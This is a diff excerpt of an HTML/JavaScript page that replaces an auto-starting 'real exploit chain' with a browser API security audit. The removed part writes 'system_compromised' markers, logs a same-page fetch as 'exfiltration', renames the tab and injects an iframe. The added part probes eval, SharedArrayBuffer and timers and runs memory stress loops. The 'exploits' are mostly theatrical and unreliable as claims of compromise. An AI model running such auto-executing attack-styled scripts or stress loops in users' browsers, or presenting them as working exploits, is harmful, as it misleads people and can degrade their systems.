+            // Test eval and dynamic code execution
+            log('\n▶️ Testing Code Execution APIs...', 'info');
+            try {
+                eval('void 0');
+                log('✓ eval() available', 'access');
+                auditResults.dangerousAPIs++;
+            } catch(e) {
+                log('✗ eval() blocked', 'blocked');
+            }
+            
+            try {
+                new Function('return 0')();
+                log('✓ Function constructor available', 'access');
+                auditResults.dangerousAPIs++;
+            } catch(e) {
+                log('✗ Function constructor blocked', 'blocked');
+            }
+            
+            if ('Worker' in window) {
+                log('✓ Web Workers available', 'access');
+                auditResults.totalAPIs++;
+            }
+            
+            if ('SharedWorker' in window) {
+                log('✓ Shared Workers available', 'access');
+                auditResults.totalAPIs++;
+            }
+            
+            updateProgress(100);
+            updateStats();
+            
+            log('\n✅ AUDIT COMPLETE', 'info');
+            log(`Found ${auditResults.totalAPIs} APIs, ${auditResults.totalMethods} methods, ${auditResults.dangerousAPIs} dangerous APIs`, 'info');
+            
+            // Summary
+            log('\n📋 SECURITY ASSESSMENT:', 'info');
+            if (auditResults.dangerousAPIs > 10) {
+                log('⚠️ HIGH RISK: Many dangerous APIs are accessible', 'warning');
+            } else if (auditResults.dangerousAPIs > 3) {
+                log('⚠️ MEDIUM RISK: Some dangerous APIs are accessible', 'warning');
             } else {
-                log('✓ WORKER EXECUTION: ' + JSON.stringify(e.data));
-                worker.terminate();
+                log('✓ LOW RISK: Minimal dangerous APIs accessible', 'access');
             }
-        };
+        }
         
-        return true;
+        // ==================== ADDITIONAL TESTS ====================
         
-    } catch(e) {
-        log('✗ Worker exploit failed: ' + e.message);
-        return false;
-    }
-}
-
-// MAIN EXPLOIT CHAIN
-function runRealExploits() {
-    log('🔥 STARTING REAL EXPLOIT CHAIN...\n');
-    
-    const exploits = [
-        exploitUseAfterFree,
-        exploitTypeConfusion,
-        exploitArraySort,
-        exploitDataView,
-        exploitFunctionBind,
-        exploitWasmMemory,
-        exploitEval,
-        exploitNewFunction,
-        exploitPrototypePollution,
-        exploitWorker
-    ];
-    
-    let successCount = 0;
-    let current = 0;
-    
-    function runNext() {
-        if (current < exploits.length) {
-            const exploit = exploits[current];
-            setTimeout(() => {
-                if (exploit()) successCount++;
-                current++;
-                runNext();
-            }, 500);
-        } else {
-            log('\n=== REAL EXPLOIT CHAIN COMPLETE ===');
-            log('Successful: ' + successCount + '/' + exploits.length);
+        async function testExploitVectors() {
+            log('🧪 TESTING EXPLOIT VECTORS...', 'warning');
             
-            if (successCount > 0) {
-                log('💥 REAL CODE EXECUTION ACHIEVED');
-                log('🎯 SYSTEM COMPROMISED');
+            const exploitTests = [
+                { name: 'Buffer Overflow Patterns', test: testBufferOverflow },
+                { name: 'Type Confusion', test: testTypeConfusion },
+                { name: 'Race Conditions', test: testRaceConditions },
+                { name: 'Side Channel Attacks', test: testSideChannels }
+            ];
+            
+            for (const test of exploitTests) {
+                try {
+                    await test.test();
+                } catch(e) {
+                    log(`Exploit vector ${test.name}: ${e.message}`, 'error');
+                }
+            }
+        }
+        
+        async function testBufferOverflow() {
+            log('Testing buffer overflow patterns...', 'info');
+            
+            try {
+                // Try to create massive arrays
+                const hugeArray = new Array(1000000000);
+                log('✓ Can allocate large arrays', 'access');
+            } catch(e) {
+                log('✗ Array size limited', 'blocked');
+            }
+            
+            try {
+                const sab = new SharedArrayBuffer(1024 * 1024 * 1024); // 1GB
+                log('✓ Can allocate large SharedArrayBuffer', 'access');
+                auditResults.dangerousAPIs++;
+            } catch(e) {
+                log('✗ SharedArrayBuffer size limited', 'blocked');
+            }
+        }
+        
+        async function testTypeConfusion() {
+            log('Testing type confusion patterns...', 'info');
+            
+            // Test if we can confuse types
+            const arr = new Array(10).fill(1);
+            arr[0] = { valueOf: () => { throw new Error('type confusion test'); } };
+            
+            try {
+                arr.sort();
+                log('✓ Array sort vulnerable to type confusion', 'warning');
+            } catch(e) {
+                log('✗ Array sort handles type confusion', 'access');
+            }
+        }
+        
+        async function testRaceConditions() {
+            log('Testing race condition potential...', 'info');
+            
+            if (typeof SharedArrayBuffer !== 'undefined' && typeof Atomics !== 'undefined') {
+                log('✓ Shared memory + Atomics available (race conditions possible)', 'warning');
+                auditResults.dangerousAPIs++;
                 
-                // Deploy real payload
-                deployRealPayload();
-            } else {
-                log('❌ All exploits failed - System secure');
+                // Test if we can create a race
+                const sab = new SharedArrayBuffer(4);
+                const arr = new Int32Array(sab);
+                
+                // This doesn't actually create a race, but tests API availability
+                Atomics.store(arr, 0, 42);
+                const value = Atomics.load(arr, 0);
+                log(`Atomics test: stored ${value}`, 'info');
             }
         }
-    }
-    
-    runNext();
-}
-
-// REAL PAYLOAD DEPLOYMENT
-function deployRealPayload() {
-    log('\n🚀 DEPLOYING REAL PAYLOAD...');
-    
-    try {
-        // Real system manipulation
-        if (localStorage) {
-            localStorage.setItem('system_compromised', Date.now());
-            localStorage.setItem('attacker_ip', 'real_exploit');
+        
+        async function testSideChannels() {
+            log('Testing side channel attack potential...', 'info');
+            
+            // High resolution timer
+            if (performance.now) {
+                const start = performance.now();
+                for (let i = 0; i < 1000; i++) Math.sqrt(i);
+                const end = performance.now();
+                
+                if (end - start < 0.1) {
+                    log('✓ High resolution timer available (timing attacks possible)', 'warning');
+                }
+            }
+            
+            // Memory measurement
+            if (performance.memory) {
+                log(`Memory: ${performance.memory.usedJSHeapSize} bytes used`, 'info');
+                log('✓ Memory measurement available', 'access');
+            }
         }
         
-        // Real network activity
-        fetch(window.location.href)
-            .then(r => r.text())
-            .then(data => {
-                log('✓ NETWORK EXFILTRATION: ' + data.length + ' bytes');
-            });
-        
-        // Real DOM manipulation
-        document.title = '💣 COMPROMISED - ' + Date.now();
-        
-        // Real code execution proof
-        const iframe = document.createElement('iframe');
-        iframe.srcdoc = '<script>parent.postMessage("PAYLOAD_ACTIVE","*")</script>';
-        document.body.appendChild(iframe);
-        
-        window.addEventListener('message', (e) => {
-            if (e.data === 'PAYLOAD_ACTIVE') {
-                log('✅ PAYLOAD EXECUTION CONFIRMED');
-                document.body.removeChild(iframe);
+        async function stressTestAPIs() {
+            log('💥 INITIATING STRESS TESTS...', 'warning');
+            
+            // Create many objects
+            for (let i = 0; i < 1000; i++) {
+                try {
+                    new ArrayBuffer(1024 * 1024); // 1MB each
+                } catch(e) {
+                    log(`Memory exhausted after ${i} allocations`, 'warning');
+                    break;
+                }
             }
-        });
+            
+            // Stress GC
+            let objs = [];
+            for (let i = 0; i < 10000; i++) {
+                objs.push({ data: new Array(1000).fill(i) });
+            }
+            objs = null;
+            
+            log('Stress test complete', 'info');
+        }
         
-        log('✅ REAL PAYLOAD DEPLOYED SUCCESSFULLY');
+        function dumpGlobalObject() {
+            log('📁 DUMPING GLOBAL OBJECT PROPERTIES...', 'info');
+            
+            let count = 0;
+            for (let prop in window) {
+                try {
+                    if (count < 50) { // Limit output
+                        const type = typeof window[prop];
+                        log(`${prop}: ${type}`, 'info');
+                    }
+                    count++;
+                } catch(e) {
+                    // Skip inaccessible properties
+                }
+            }
+            
+            log(`Total properties in global object: ${count}`, 'info');
+        }
         
-    } catch(e) {
-        log('✗ Payload deployment failed: ' + e.message);
-    }
-}
-
-// AUTO-START
-setTimeout(runRealExploits, 1000);
-</script>
+        // Initialize
+        log('System ready. Click "FULL SYSTEM AUDIT" to begin.', 'info');
+    </script>
 </body>
 </html>
